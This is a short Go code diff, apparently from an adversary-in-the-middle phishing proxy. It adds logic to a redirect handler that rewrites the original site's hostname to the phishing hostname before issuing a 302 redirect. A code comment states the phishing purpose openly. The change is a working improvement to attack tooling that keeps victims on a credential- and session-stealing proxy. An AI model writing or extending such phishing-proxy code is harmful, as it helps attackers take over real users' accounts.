@@ -783,6 +783,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						u, err := url.Parse(rurl)
 						if err == nil {
 							if strings.EqualFold(req_path, u.Path) == false {
+								// rewrite original hostname to phishing hostname
+								if phish_host, ok := p.replaceHostWithPhished(u.Host); ok {
+									u.Host = phish_host
+									rurl = u.String()
+								}
 								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 								if resp != nil {
 									resp.Header.Add("Location", rurl)
